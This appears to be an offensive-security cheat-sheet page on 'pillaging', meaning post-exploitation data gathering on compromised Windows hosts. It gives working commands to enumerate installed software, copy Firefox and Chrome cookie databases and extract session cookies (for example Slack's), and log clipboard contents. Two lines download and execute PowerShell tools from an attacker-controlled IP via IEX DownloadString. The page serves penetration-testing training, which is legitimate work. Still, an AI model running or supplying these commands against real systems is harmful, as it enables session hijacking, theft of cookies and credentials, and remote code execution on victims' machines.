# Pillaging

Yaaaaarr !

Pillaging is the process of obtaining information from a compromised system, like credentials, sensitive information, network information etc...
It's like post exploitation enumeration.

## List installed applications 

Here's a technique to list installed applications using powershell and registry keys.
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```


## Grab firefox cookies 

First copy the database using :
```cmd
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
``` 

It's a standard sqlite database, you don't need extra tools to get the cookies it contains, but it's easier using [this python script](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)    
```sh
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

## Grab cookies from chrome-based browsers

Using [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1) : 
```ps1
# First run the script
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.143/Invoke-SharpChromium.ps1')

# Then you can swearch for cookies like so :  
Invoke-SharpChromium -Command "cookies slack.com"
``` 
Depending on the version of chrome, the cookie database location might differ.
Use this command if you need to copy it to sharpchromium's expected location : 
```bat
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
``` 

## Clipboard

A handy tool to mess with the clipboard is [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1), a powershell script allowing us to log clipboard contents :
```ps1
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.143/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
``` 

